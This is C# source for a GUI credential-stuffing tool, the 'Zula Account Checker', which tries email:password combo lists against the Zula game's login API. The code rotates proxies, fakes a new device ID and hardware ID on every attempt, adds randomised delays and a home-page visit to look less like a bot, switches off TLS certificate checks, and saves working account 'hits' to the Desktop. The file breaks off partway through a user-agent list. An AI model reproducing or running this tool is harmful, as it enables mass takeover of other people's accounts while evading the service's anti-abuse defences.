using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace ZulaChecker
{
    public class MainForm : Form
    {
        private TextBox txtComboFile, txtProxyFile, txtApiUrl;
        private Label lblUrlStatus, lblTotal, lblValid, lblInvalid, lblSpeed, lblProxyStatus;
        private NumericUpDown numThreads, numProxyThreads, numMinutes;
        private Button btnStart, btnStop, btnCheckProxies, btnCheckMax;
        private RichTextBox rtbLog;
        private Panel headerPanel, statsPanel, configPanel, logPanel;
        private CheckBox chkUseProxy, chkLimitMinutes;

        private ConcurrentBag<string> hits = new ConcurrentBag<string>();
        private ConcurrentQueue<string> proxyQueue = new ConcurrentQueue<string>();
        private List<string> workingProxies = new List<string>();
        private ConcurrentDictionary<string, string> proxyDeviceIds = new ConcurrentDictionary<string, string>();
        private int totalChecked = 0, totalValid = 0, totalInvalid = 0, totalProxyErrors = 0;
        private DateTime startTime;
        private CancellationTokenSource cts;
        private static readonly object proxyLock = new object();

        private static readonly ThreadLocal<Random> _random = new ThreadLocal<Random>(() => new Random(Guid.NewGuid().GetHashCode()));

        private Color bgPrimary = Color.FromArgb(10, 10, 14);
        private Color bgSecondary = Color.FromArgb(18, 18, 26);
        private Color bgCard = Color.FromArgb(24, 24, 34);
        private Color accentMain = Color.FromArgb(67, 97, 238);
        private Color accentGradStart = Color.FromArgb(67, 97, 238);
        private Color accentGradEnd = Color.FromArgb(114, 9, 183);
        private Color textPrimary = Color.FromArgb(255, 255, 255);
        private Color textSecondary = Color.FromArgb(148, 163, 184);
        private Color successGreen = Color.FromArgb(16, 185, 129);
        private Color errorRed = Color.FromArgb(239, 68, 68);
        private Color warningOrange = Color.FromArgb(245, 158, 11);


        private GraphicsPath GetRoundedPath(Rectangle rect, int radius)
        {
            GraphicsPath path = new GraphicsPath();
            float r = radius * 2;
            path.AddArc(rect.X, rect.Y, r, r, 180, 90);
            path.AddArc(rect.Right - r, rect.Y, r, r, 270, 90);
            path.AddArc(rect.Right - r, rect.Bottom - r, r, r, 0, 90);
            path.AddArc(rect.X, rect.Bottom - r, r, r, 90, 90);
            path.CloseFigure();
            return path;
        }

        // Draggable Helper
        private void MakeDraggable(Control control)
        {
            control.MouseDown += (s, e) => { if (e.Button == MouseButtons.Left) { isDragging = true; dragStart = e.Location; } };
            control.MouseMove += (s, e) => { if (isDragging) { var p = PointToScreen(e.Location); Location = new Point(p.X - dragStart.X, p.Y - dragStart.Y); } };
            control.MouseUp += (s, e) => isDragging = false;
        }

        private bool isDragging = false;
        private Point dragStart = Point.Empty;
        private bool isMiniMode = false;
        private Point originalStatsLoc;
        private Size originalFormSize;


        public MainForm()
        {
            ServicePointManager.DefaultConnectionLimit = 1000;
            ServicePointManager.Expect100Continue = false;
            ServicePointManager.UseNagleAlgorithm = false;

            InitializeUI();
            this.Paint += (s, e) =>
            {
                using (var brush = new LinearGradientBrush(ClientRectangle, bgPrimary, Color.FromArgb(20, 20, 30), 45f))
                    e.Graphics.FillRectangle(brush, ClientRectangle);
            };
        }

        private void InitializeUI()
        {
            Text = "Zula Account Checker";
            ClientSize = new Size(950, 600);
            StartPosition = FormStartPosition.CenterScreen;
            FormBorderStyle = FormBorderStyle.None;
            BackColor = bgPrimary;

            // Region for rounded form
            this.Load += (s, e) => {
                this.Region = new Region(GetRoundedPath(new Rectangle(0, 0, Width, Height), 15));
                originalFormSize = this.Size;
            };

            // Global Dragging
            MakeDraggable(this);

            headerPanel = new Panel { Location = new Point(0, 0), Size = new Size(950, 70), BackColor = Color.FromArgb(28, 28, 40) };
            MakeDraggable(headerPanel);
            headerPanel.Paint += (s, e) => { 
                using (var brush = new LinearGradientBrush(headerPanel.ClientRectangle, accentGradStart, accentGradEnd, 0f))
                using (var pen = new Pen(brush, 4))
                    e.Graphics.DrawLine(pen, 0, 68, headerPanel.Width, 68);
            };
            
            var titleLabel = new Label { 
                Text = "ZULA ACCOUNT CHECKER", 
                Location = new Point(25, 22), 
                Size = new Size(300, 30), 
                Font = new Font("Segoe UI Semibold", 15, FontStyle.Bold), 
                ForeColor = textPrimary, 
                BackColor = Color.Transparent 
            };
            MakeDraggable(titleLabel);
            headerPanel.Controls.Add(titleLabel);

            var leaternLabel = new Label { 
                Text = "BY LEATERN", 
                Location = new Point( titleLabel.Right - 265, 29), 
                Size = new Size(200, 20), 
                Font = new Font("Segoe UI", 8, FontStyle.Bold), 
                ForeColor = accentMain, 
                BackColor = Color.Transparent 
            };
            headerPanel.Controls.Add(leaternLabel);

            var btnClose = CreateHeaderButton("✕", 905, 18, 30, 30, errorRed);
            btnClose.Anchor = AnchorStyles.Top | AnchorStyles.Right;
            btnClose.Click += (s, e) => Application.Exit();
            headerPanel.Controls.Add(btnClose);

            var btnMin = CreateHeaderButton("—", 865, 18, 30, 30, textSecondary);
            btnMin.Anchor = AnchorStyles.Top | AnchorStyles.Right;
            btnMin.Click += (s, e) => WindowState = FormWindowState.Minimized;
            headerPanel.Controls.Add(btnMin);

            // Mini Mode Button
            var btnMiniMode = CreateHeaderButton("❐", 825, 18, 30, 30, accentMain);
            btnMiniMode.Anchor = AnchorStyles.Top | AnchorStyles.Right;
            btnMiniMode.Click += (s, e) => ToggleMiniMode(btnClose, btnMin, btnMiniMode);
            headerPanel.Controls.Add(btnMiniMode);
            
            // Ensure buttons are on top
            btnClose.BringToFront();
            btnMin.BringToFront();
            btnMiniMode.BringToFront();

            Controls.Add(headerPanel);

            // Left Side - Config
            configPanel = CreateModernPanel(25, 95, 450, 480);
            MakeDraggable(configPanel);
            configPanel.Controls.Add(CreateSectionLabel("NETWORK CONFIGURATION", 20, 20));

            txtApiUrl = CreateModernTextBox(configPanel, 20, 50, 360, "https://api.zulaoyun.com/zula/login/LogOn");
            txtApiUrl.TextChanged += async (s, e) => await CheckApiUrl();

            lblUrlStatus = new Label { Text = "●", Location = new Point(390, 50), Size = new Size(30, 28), Font = new Font("Segoe UI", 14), ForeColor = successGreen, BackColor = Color.Transparent, TextAlign = ContentAlignment.MiddleCenter };
            configPanel.Controls.Add(lblUrlStatus);

            configPanel.Controls.Add(CreateSectionLabel("FILE MANAGEMENT", 20, 100));
            txtComboFile = CreateModernTextBox(configPanel, 20, 130, 350, "combo.txt");
            var btnBrowseCombo = CreateModernButton("📁", 380, 128, 40, 32, accentMain);
            btnBrowseCombo.Click += (s, e) => BrowseFile(txtComboFile);
            configPanel.Controls.Add(btnBrowseCombo);

            txtProxyFile = CreateModernTextBox(configPanel, 20, 175, 230, "proxies.txt");
            var btnBrowseProxy = CreateModernButton("📁", 260, 173, 40, 32, accentMain);
            btnBrowseProxy.Click += async (s, e) => { BrowseFile(txtProxyFile); if (File.Exists(txtProxyFile.Text)) await LoadProxies(); };
            configPanel.Controls.Add(btnBrowseProxy);
            
            btnCheckProxies = CreateModernButton("VERIFY PROXIES", 310, 173, 120, 32, Color.FromArgb(124, 58, 237));
            btnCheckProxies.Click += async (s, e) => await CheckProxies();
            configPanel.Controls.Add(btnCheckProxies);

            chkUseProxy = new CheckBox { Text = "ENABLE PROXIES", Location = new Point(20, 215), Size = new Size(150, 20), ForeColor = accentGradStart, BackColor = Color.Transparent, Font = new Font("Segoe UI", 8, FontStyle.Bold), Checked = true };
            chkUseProxy.CheckedChanged += (s, e) => {
                if (!chkUseProxy.Checked) { lblProxyStatus.Text = "⚠ DIRECT CONNECTION ACTIVE"; lblProxyStatus.ForeColor = warningOrange; }
                else if (workingProxies.Count > 0) { lblProxyStatus.Text = $"✓ {workingProxies.Count} PROXIES READY"; lblProxyStatus.ForeColor = successGreen; }
                else { lblProxyStatus.Text = "NO PROXIES LOADED"; lblProxyStatus.ForeColor = textSecondary; }
            };
            configPanel.Controls.Add(chkUseProxy);

            lblProxyStatus = new Label { Text = "NO PROXIES LOADED", Location = new Point(180, 218), Size = new Size(250, 18), Font = new Font("Segoe UI Semibold", 7), ForeColor = textSecondary, BackColor = Color.Transparent };
            configPanel.Controls.Add(lblProxyStatus);

            configPanel.Controls.Add(CreateSectionLabel("PREFERENCES", 20, 255));
            var tableLayout = new TableLayoutPanel { Location = new Point(20, 285), Size = new Size(410, 100), BackColor = Color.Transparent, ColumnCount = 2, RowCount = 3 };
            tableLayout.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 60));
            tableLayout.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 40));
            tableLayout.RowStyles.Add(new RowStyle(SizeType.Percent, 33.33f));
            tableLayout.RowStyles.Add(new RowStyle(SizeType.Percent, 33.33f));
            tableLayout.RowStyles.Add(new RowStyle(SizeType.Percent, 33.33f));

            tableLayout.Controls.Add(new Label { Text = "CHECKER THREADS:", ForeColor = textSecondary, Font = new Font("Segoe UI", 9), TextAlign = ContentAlignment.MiddleLeft, Dock = DockStyle.Fill }, 0, 0);
            numThreads = new NumericUpDown { Anchor = AnchorStyles.Left | AnchorStyles.Right, Margin = new Padding(0, 6, 0, 0), Minimum = 1, Maximum = 500, Value = 20, BackColor = bgSecondary, ForeColor = textPrimary, BorderStyle = BorderStyle.None, Font = new Font("Segoe UI", 10) };
            tableLayout.Controls.Add(numThreads, 1, 0);

            tableLayout.Controls.Add(new Label { Text = "PROXY THREADS:", ForeColor = textSecondary, Font = new Font("Segoe UI", 9), TextAlign = ContentAlignment.MiddleLeft, Dock = DockStyle.Fill }, 0, 1);
            numProxyThreads = new NumericUpDown { Anchor = AnchorStyles.Left | AnchorStyles.Right, Margin = new Padding(0, 6, 0, 0), Minimum = 1, Maximum = 200, Value = 10, BackColor = bgSecondary, ForeColor = textPrimary, BorderStyle = BorderStyle.None, Font = new Font("Segoe UI", 10) };
            tableLayout.Controls.Add(numProxyThreads, 1, 1);

            chkLimitMinutes = new CheckBox { Text = "INTERVAL (MINUTES):", ForeColor = textSecondary, Font = new Font("Segoe UI", 9), Dock = DockStyle.Fill, Checked = true };
            chkLimitMinutes.CheckedChanged += (s, e) => numMinutes.Enabled = chkLimitMinutes.Checked;
            tableLayout.Controls.Add(chkLimitMinutes, 0, 2);

            numMinutes = new NumericUpDown { Anchor = AnchorStyles.Left | AnchorStyles.Right, Margin = new Padding(0, 6, 0, 0), Minimum = 1, Maximum = 60, Value = 5, BackColor = bgSecondary, ForeColor = textPrimary, BorderStyle = BorderStyle.None, Font = new Font("Segoe UI", 10) };
            tableLayout.Controls.Add(numMinutes, 1, 2);
            configPanel.Controls.Add(tableLayout);

            btnStart = CreateModernButton("LAUNCH CHECKER", 20, 410, 195, 45, successGreen);
            btnStart.Font = new Font("Segoe UI", 11, FontStyle.Bold);
            btnStart.Click += async (s, e) => await StartChecking();
            configPanel.Controls.Add(btnStart);

            btnStop = CreateModernButton("ABORT", 225, 410, 205, 45, errorRed);
            btnStop.Font = new Font("Segoe UI", 11, FontStyle.Bold);
            btnStop.Enabled = false;
            btnStop.Click += (s, e) => StopChecking();
            configPanel.Controls.Add(btnStop);

            Controls.Add(configPanel);

            // Right Side - Stats & Log
            statsPanel = CreateModernPanel(500, 95, 425, 100);
            MakeDraggable(statsPanel);
            originalStatsLoc = statsPanel.Location;
            statsPanel.Controls.Add(CreateStatCard("TOTAL", "0", 10, 15, 95, 75, accentMain, ref lblTotal));
            statsPanel.Controls.Add(CreateStatCard("VALID", "0", 115, 15, 95, 75, successGreen, ref lblValid));
            statsPanel.Controls.Add(CreateStatCard("INVALID", "0", 220, 15, 95, 75, errorRed, ref lblInvalid));
            statsPanel.Controls.Add(CreateStatCard("SPEED", "0/s", 325, 15, 95, 75, Color.FromArgb(249, 115, 22), ref lblSpeed));
            Controls.Add(statsPanel);

            logPanel = CreateModernPanel(500, 215, 425, 360);
            MakeDraggable(logPanel);
            var logHeader = new Label { Text = "ACTIVITY LOG", Location = new Point(20, 15), Size = new Size(200, 25), Font = new Font("Segoe UI", 10, FontStyle.Bold), ForeColor = textPrimary, BackColor = Color.Transparent };
            logPanel.Controls.Add(logHeader);
            
            rtbLog = new RichTextBox { 
                Location = new Point(15, 50), 
                Size = new Size(395, 290), 
                BackColor = bgSecondary, 
                ForeColor = textPrimary, 
                BorderStyle = BorderStyle.None, 
                Font = new Font("Consolas", 9), 
                ReadOnly = true, 
                WordWrap = true 
            };
            logPanel.Controls.Add(rtbLog);
            Controls.Add(logPanel);
        }

        private async Task LoadProxies()
        {
            if (!File.Exists(txtProxyFile.Text)) return;
            btnStart.Enabled = false;
            btnCheckProxies.Enabled = false;
            LogMessage("📂 Loading proxies...", accentMain);

            var allProxies = File.ReadAllLines(txtProxyFile.Text).Where(l => !string.IsNullOrWhiteSpace(l)).Select(l => l.Trim()).Distinct().ToList();
            workingProxies.Clear();
            workingProxies.AddRange(allProxies);
            lblProxyStatus.Text = $"✓ {workingProxies.Count} proxies loaded (not tested)";
            lblProxyStatus.ForeColor = Color.Orange;
            LogMessage($"✓ Loaded {workingProxies.Count} proxies", successGreen);

            if (workingProxies.Count > 0)
            {
                var sample = workingProxies[0];
                if (sample.Split(':').Length == 4) LogMessage("✓ Format: IP:Port:User:Pass", accentMain);
                else if (sample.Split(':').Length == 2) LogMessage("✓ Format: IP:Port", accentMain);
            }

            LogMessage("💡 Tip: Click '✓ Test' to verify proxies", accentGradEnd);
            RefillProxyQueue();
            btnStart.Enabled = true;
            btnCheckProxies.Enabled = true;
        }

        private async Task CheckProxies()
        {
            if (!File.Exists(txtProxyFile.Text)) { MessageBox.Show("Proxy file not found!"); return; }
            btnCheckProxies.Enabled = false;
            btnStart.Enabled = false;
            workingProxies.Clear();

            LogMessage("🌐 Checking your real IP...", accentMain);
            string realIP = await GetRealIP();
            if (string.IsNullOrEmpty(realIP)) { LogMessage("❌ Could not detect real IP!", errorRed); btnCheckProxies.Enabled = true; btnStart.Enabled = true; return; }
            LogMessage($"✓ Your IP: {realIP}", successGreen);

            var allProxies = File.ReadAllLines(txtProxyFile.Text).Where(l => !string.IsNullOrWhiteSpace(l)).Select(l => l.Trim()).Distinct().ToList();
            LogMessage($"🔍 Testing {allProxies.Count} proxies (Round 1)...", accentGradEnd);
            lblProxyStatus.Text = "Checking proxies...";
            lblProxyStatus.ForeColor = accentGradEnd;

            int checkedCount = 0;
            var semaphore = new SemaphoreSlim((int)numProxyThreads.Value);
            var tasks = allProxies.Select(async proxy =>
            {
                await semaphore.WaitAsync();
                try
                {
                    var proxyIP = await TestProxyAndGetIP(proxy);
                    if (!string.IsNullOrEmpty(proxyIP)) { lock (workingProxies) { workingProxies.Add(proxy); } }
                    Interlocked.Increment(ref checkedCount);
                    Invoke(new Action(() => { lblProxyStatus.Text = $"Round 1: {workingProxies.Count} working | {checkedCount}/{allProxies.Count}"; }));
                }
                finally { semaphore.Release(); }
            });
            await Task.WhenAll(tasks);

            if (workingProxies.Count > 0)
            {
                LogMessage($"🔄 Re-checking {workingProxies.Count} proxies (Round 2)...", accentGradEnd);
                var firstRound = workingProxies.ToList();
                workingProxies.Clear();
                checkedCount = 0;
                var reTasks = firstRound.Select(async proxy =>
                {
                    await semaphore.WaitAsync();
                    try
                    {
                        var proxyIP = await TestProxyAndGetIP(proxy);
                        if (!string.IsNullOrEmpty(proxyIP) && proxyIP != realIP) { lock (workingProxies) { workingProxies.Add(proxy); } }
                        Interlocked.Increment(ref checkedCount);
                        Invoke(new Action(() => { lblProxyStatus.Text = $"Round 2: {workingProxies.Count} working | {checkedCount}/{firstRound.Count}"; }));
                    }
                    finally { semaphore.Release(); }
                });
                await Task.WhenAll(reTasks);
            }

            if (workingProxies.Count > 0)
            {
                string file = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), $"working_proxies_{DateTime.Now:yyyyMMdd_HHmmss}.txt");
                File.WriteAllLines(file, workingProxies);
                LogMessage($"✓ Found {workingProxies.Count} working proxies", successGreen);
                lblProxyStatus.Text = $"✓ {workingProxies.Count} working proxies";
                lblProxyStatus.ForeColor = successGreen;
                RefillProxyQueue();
            }
            else
            {
                LogMessage("❌ No working proxies!", errorRed);
                lblProxyStatus.Text = "❌ No working proxies";
                lblProxyStatus.ForeColor = errorRed;
            }

            btnCheckProxies.Enabled = true;
            btnStart.Enabled = true;
        }

        private void RefillProxyQueue()
        {
            proxyQueue = new ConcurrentQueue<string>();
            foreach (var proxy in workingProxies) proxyQueue.Enqueue(proxy);
        }

        private async Task<string> GetRealIP()
        {
            try
            {
                using var client = new HttpClient(new HttpClientHandler { ServerCertificateCustomValidationCallback = (s, c, ch, e) => true }) { Timeout = TimeSpan.FromSeconds(10) };
                var response = await client.GetAsync("https://api.ipify.org?format=json");
                if (response.IsSuccessStatusCode)
                {
                    var json = JObject.Parse(await response.Content.ReadAsStringAsync());
                    return json["ip"]?.Value<string>();
                }
            }
            catch { }
            return null;
        }

        private async Task<string> TestProxyAndGetIP(string proxy)
        {
            try
            {
                var parts = proxy.Split(':');
                WebProxy webProxy = parts.Length == 4 ? new WebProxy($"http://{parts[0]}:{parts[1]}") { Credentials = new NetworkCredential(parts[2], parts[3]) } : parts.Length == 2 ? new WebProxy($"http://{proxy}") : null;
                if (webProxy == null) return null;

                using var client = new HttpClient(new HttpClientHandler { Proxy = webProxy, UseProxy = true, ServerCertificateCustomValidationCallback = (s, c, ch, e) => true, PreAuthenticate = true }) { Timeout = TimeSpan.FromSeconds(15) };
                
                // Zula'ya erişim dene
                var response = await client.GetAsync("https://zulaoyun.com/");
                if (response.IsSuccessStatusCode)
                {
                    return "CONNECTED";
                }
            }
            catch { }
            return null;
        }

        private string GetNextProxy()
        {
            if (workingProxies.Count == 0) return null;

            lock (proxyLock)
            {
                if (proxyQueue.TryDequeue(out string proxy))
                {
                    proxyQueue.Enqueue(proxy);
                    return proxy;
                }

                RefillProxyQueue();
                if (proxyQueue.TryDequeue(out proxy))
                {
                    proxyQueue.Enqueue(proxy);
                    return proxy;
                }
            }

            return null;
        }

        private async Task StartChecking()
        {
            if (!File.Exists(txtComboFile.Text)) { MessageBox.Show("Combo file not found!"); return; }
            btnStart.Enabled = false;
            btnStop.Enabled = true;
            btnCheckProxies.Enabled = false;
            chkUseProxy.Enabled = false;
            cts = new CancellationTokenSource();
            hits.Clear();
            totalChecked = totalValid = totalInvalid = totalProxyErrors = 0;
            rtbLog.Clear();
            LogMessage("🚀 Starting checker...", accentMain);

            if (chkUseProxy.Checked && workingProxies.Count > 0)
            {
                LogMessage("🔍 Verifying proxy...", accentMain);
                RefillProxyQueue();
                string realIP = await GetRealIP();
                if (!string.IsNullOrEmpty(realIP))
                {
                    LogMessage($"Your IP: {realIP}", textSecondary);
                    bool proxyWorking = false;
                    for (int i = 0; i < Math.Min(3, workingProxies.Count); i++)
                    {
                        string proxyIP = await TestProxyAndGetIP(workingProxies[i]);
                        if (!string.IsNullOrEmpty(proxyIP) && proxyIP != realIP) { LogMessage($"✓ Proxy #{i + 1} working! IP: {proxyIP}", successGreen); proxyWorking = true; break; }
                    }
                    if (!proxyWorking)
                    {
                        LogMessage("❌ WARNING: Proxies failed!", errorRed);
                        if (MessageBox.Show("Proxies not working!\n\nContinue without proxy?", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
                        { chkUseProxy.Checked = false; LogMessage("⚠ Switched to direct connection", warningOrange); }
                        else
                        { btnStart.Enabled = true; btnStop.Enabled = false; btnCheckProxies.Enabled = true; chkUseProxy.Enabled = true; return; }
                    }
                }
            }
            else
            {
                LogMessage("⚠ No proxies - using direct connection", warningOrange);
                string realIP = await GetRealIP();
                if (!string.IsNullOrEmpty(realIP)) LogMessage($"Your IP: {realIP}", textSecondary);
            }

            var combos = File.ReadAllLines(txtComboFile.Text).Where(l => !string.IsNullOrWhiteSpace(l)).Select(l => l.Split(':')).Where(p => p.Length >= 2).Select(p => (email: p[0].Trim(), password: string.Join(":", p.Skip(1)).Trim())).ToList();
            LogMessage($"✓ Loaded {combos.Count} combos", successGreen);
            if (chkUseProxy.Checked && workingProxies.Count > 0) LogMessage($"✓ Using {workingProxies.Count} proxies", successGreen);

            startTime = DateTime.Now;
            await CheckAllCombos(combos, (int)numThreads.Value, cts.Token);
            LogMessage($"✓ Finished! Time: {(DateTime.Now - startTime).TotalSeconds:F1}s", accentGradEnd);
            if (totalProxyErrors > 0) LogMessage($"⚠ Proxy errors: {totalProxyErrors}", warningOrange);

            if (hits.Count > 0)
            {
                string file = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), $"zula_hits_{DateTime.Now:yyyyMMdd_HHmmss}.txt");
                File.WriteAllLines(file, hits);
                LogMessage($"💾 Saved {hits.Count} hits to Desktop", successGreen);
            }

            btnStart.Enabled = true;
            btnStop.Enabled = false;
            btnCheckProxies.Enabled = true;
            chkUseProxy.Enabled = true;
        }

        private void StopChecking()
        {
            cts?.Cancel();
            LogMessage("⚠ Stopped", errorRed);
            btnStart.Enabled = true;
            btnStop.Enabled = false;
            btnCheckProxies.Enabled = true;
        }

        private async Task CheckAllCombos(List<(string email, string password)> combos, int threads, CancellationToken ct)
        {
            try
            {
                int intervalMinutes = chkLimitMinutes.Checked ? (int)numMinutes.Value : 0;
                if (intervalMinutes > 0) LogMessage($"⏱️ Check interval: {intervalMinutes} minutes between checks", accentGradEnd);
                else LogMessage("⚡ continuous checking mode enabled", accentGradEnd);

                // Proxy kullanılıyorsa thread sayısını düşür
                int effectiveThreads = (chkUseProxy.Checked && workingProxies.Count > 0) ? Math.Min(threads, 5) : threads;

                if (chkUseProxy.Checked && workingProxies.Count > 0)
                {
                    LogMessage($"⚙️ Using {effectiveThreads} threads with proxies", accentGradEnd);
                }
                else
                {
                    LogMessage($"⚙️ Using {effectiveThreads} threads (direct connection)", accentGradEnd);
                }

                int comboIndex = 0;
                while (comboIndex < combos.Count && !ct.IsCancellationRequested)
                {
                    var combo = combos[comboIndex];

                    var (isValid, response) = await CheckComboWithRetry(combo.email, combo.password);
                    Interlocked.Increment(ref totalChecked);
                    if (isValid)
                    {
                        string extraInfo = "";
                        try
                        {
                            var json = JObject.Parse(response);
                            
                            // Ban Kontrolü (Id: 6)
                            if (json["Id"]?.Value<int>() == 6)
                            {
                                string banDate = json["Text"]?.ToString();
                                extraInfo += $" | ⛔ BANNED: {banDate}";
                            }
                            // Diğer durumlar aktif kabul edilir
                        }
                        catch { }

                        hits.Add($"{combo.email}:{combo.password}{extraInfo}");
                        Interlocked.Increment(ref totalValid);
                        Invoke(new Action(() => LogMessage($"✅ {combo.email}{extraInfo}", successGreen)));
                    }
                    else Interlocked.Increment(ref totalInvalid);
                    UpdateStats();

                    comboIndex++;

                    // Her combo sonrası belirtilen süre kadar bekle
                    if (chkLimitMinutes.Checked && comboIndex < combos.Count && !ct.IsCancellationRequested)
                    {
                        int delayMs = intervalMinutes * 60 * 1000;
                        await Task.Delay(delayMs, ct);
                    }
                }
            }
            catch (OperationCanceledException) { }
        }

        private void ToggleMiniMode(Button btnClose, Button btnMin, Button btnMini)
        {
            isMiniMode = !isMiniMode;

            if (isMiniMode)
            {
                // Mini Mode
                this.Size = new Size(470, 250);
                headerPanel.Width = 470;
                
                btnClose.Location = new Point(425, 18);
                btnMin.Location = new Point(385, 18);
                btnMini.Location = new Point(345, 18);
                btnMini.Text = "□"; // Enlarge icon
                
                btnClose.BringToFront();
                btnMin.BringToFront();
                btnMini.BringToFront();
                
                configPanel.Visible = false;
                logPanel.Visible = false;
                
                statsPanel.Location = new Point(20, 80);
                
                // Move start/stop buttons to main form for access
                this.Controls.Add(btnStart);
                btnStart.Location = new Point(20, 190);
                btnStart.Size = new Size(200, 40);
                btnStart.BringToFront();
                
                this.Controls.Add(btnStop);
                btnStop.Location = new Point(245, 190);
                btnStop.Size = new Size(200, 40);
                btnStop.BringToFront();
            }
            else
            {
                // Full Mode
                this.Size = originalFormSize;
                headerPanel.Width = 950;
                
                btnClose.Location = new Point(905, 18);
                btnMin.Location = new Point(865, 18);
                btnMini.Location = new Point(825, 18);
                btnMini.Text = "❐"; // Mini icon

                configPanel.Visible = true;
                logPanel.Visible = true;
                
                statsPanel.Location = originalStatsLoc;
                
                // Return buttons to config panel
                configPanel.Controls.Add(btnStart);
                btnStart.Location = new Point(20, 410);
                btnStart.Size = new Size(195, 45);
                
                configPanel.Controls.Add(btnStop);
                btnStop.Location = new Point(225, 410);
                btnStop.Size = new Size(205, 45);
            }
            
            // Refresh rounded region
            this.Region = new Region(GetRoundedPath(new Rectangle(0, 0, Width, Height), 15));
            this.Invalidate();
        }

        private async Task<(bool success, string response)> CheckComboWithRetry(string email, string password)
        {
            // Proxy kullanımı kapalıysa veya proxy yoksa direkt check et
            if (!chkUseProxy.Checked || workingProxies.Count == 0)
            {
                (bool success, string response) directResult = (false, "");
                
                for (int attempt = 0; attempt < 3; attempt++)
                {
                    try
                    {
                        // Rate limit için kısa delay
                        await Task.Delay(_random.Value.Next(50, 150));
                        
                        // Her retry'da YENİ bir DeviceID/HWID kullan (sunucu "yeni cihaz" görsün)
                        var (success, response) = await CheckComboDebug(email, password, null, GenerateDeviceId(), GenerateHWID());
                        
                        if (success)
                        {
                            // ID 10 (Online) ise tekrar dene
                            // ID 10 (Online) ise direkt başarılı kabul et, bekleme yapma
                            if (response.Contains("\"Id\":10"))
                            {
                                return (true, response);
                            }
                            return (true, response);
                        }
                    }
                    catch { }
                }
                
                // Sonuç ID 10 ise ama level yoksa belirt
                if (directResult.success && directResult.response.Contains("\"Id\":10"))
                {
                     // Response değişmiyor ama logda anlaşılsın diye text manipülasyonu yapmıyoruz
                     // Parse kısmında Unknown yerine (Online) yazdıracağız.
                }
                
                return directResult.success ? directResult : (false, "");
            }

            // Proxy kullanımı açıksa
            int maxRetries = totalChecked < 3 ? 5 : 3;
            (bool success, string response) bestResult = (false, "");

            for (int attempt = 0; attempt < maxRetries; attempt++)
            {
                string proxy = GetNextProxy();
                if (proxy == null) break;

                try
                {
                    // Her retry'da YENİ DeviceID/HWID (sunucu "farklı cihaz" görsün)
                    var (success, response) = await CheckComboDebug(email, password, proxy, GenerateDeviceId(), GenerateHWID());

                    // DEBUG LOG
                    if (totalChecked < 3)
                    {
                        Invoke(new Action(() => LogMessage($"🔍 Attempt {attempt + 1} [{email}] via {proxy.Split(':')[0]}: {response.Substring(0, Math.Min(150, response.Length))}", Color.Yellow)));
                    }

                    if (success)
                    {
                        // Eğer ID 10 (Online) ise ve hakkımız varsa tekrar dene (Level almak için)
                        // ID 10 (Online) ise direkt başarılı kabul et
                        if (response.Contains("\"Id\":10"))
                        {
                            return (true, response);
                        }
                        
                        // ID 10 değilse veya banlıysa direkt dön (en iyi sonuç)
                        return (true, response);
                    }

                    // "6" response = proxy sorunu, başka proxy dene
                    if (response.Contains("\"6\"") || response == "6" || response.Contains("SHORT: \"6\""))
                    {
                        await Task.Delay(200 * (attempt + 1));
                        continue;
                    }

                    // Gerçek invalid response
                    if (response.Contains("Message") && response.Contains("\"3\""))
                    {
                        return (false, response);
                    }
                    
                    // Diğer başarısız durumlar devam etsin
                }
                catch (Exception ex)
                {
                    Interlocked.Increment(ref totalProxyErrors);
                    await Task.Delay(100);
                }
            }

            // Eğer loop bitti ve elimizde ID 10 varsa onu döndür, yoksa son başarısız sonucu
            return bestResult.success ? bestResult : (false, "");
        }

        private async Task<(bool success, string response)> CheckComboDebug(string email, string password, string proxy, string customDeviceId = null, string customHWID = null)
        {
            HttpClientHandler handler;
            string[] parts = null;

            if (!string.IsNullOrEmpty(proxy))
            {
                parts = proxy.Split(':');
                WebProxy webProxy = parts.Length == 4 ? new WebProxy($"http://{parts[0]}:{parts[1]}") { Credentials = new NetworkCredential(parts[2], parts[3]) } : parts.Length == 2 ? new WebProxy($"http://{proxy}") : null;
                if (webProxy == null) return (false, "INVALID_PROXY_FORMAT");
                handler = new HttpClientHandler
                {
                    Proxy = webProxy,
                    UseProxy = true,
                    ServerCertificateCustomValidationCallback = (s, c, ch, e) => true,
                    AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate,
                    AllowAutoRedirect = false,
                    UseCookies = true,
                    CookieContainer = new System.Net.CookieContainer(),
                    MaxConnectionsPerServer = 50,
                    PreAuthenticate = true
                };
            }
            else handler = new HttpClientHandler { ServerCertificateCustomValidationCallback = (s, c, ch, e) => true, AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate, UseCookies = false, MaxConnectionsPerServer = 100 };

            using var client = new HttpClient(handler) { Timeout = TimeSpan.FromSeconds(!string.IsNullOrEmpty(proxy) ? 45 : 15) };

            // ÖNEMLİ: Proxy ile önce ana sayfayı ziyaret et (API'yi daha az şüphelendirmek için)
            if (!string.IsNullOrEmpty(proxy))
            {
                try
                {
                    // Random delay - bot gibi görünme
                    await Task.Delay(_random.Value.Next(300, 800));

                    // Ana sayfayı ziyaret et
                    var homeRequest = new HttpRequestMessage(HttpMethod.Get, "https://zulaoyun.com/");
                    homeRequest.Headers.TryAddWithoutValidation("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36");
                    homeRequest.Headers.TryAddWithoutValidation("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
                    homeRequest.Headers.TryAddWithoutValidation("Accept-Language", "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7");
                    await client.SendAsync(homeRequest);

                    // Biraz daha bekle - insan gibi davran
                    await Task.Delay(_random.Value.Next(200, 500));
                }
                catch { }
            }

            // Daha gerçekçi User-Agent rotation
            string[] userAgents = new[]
            {
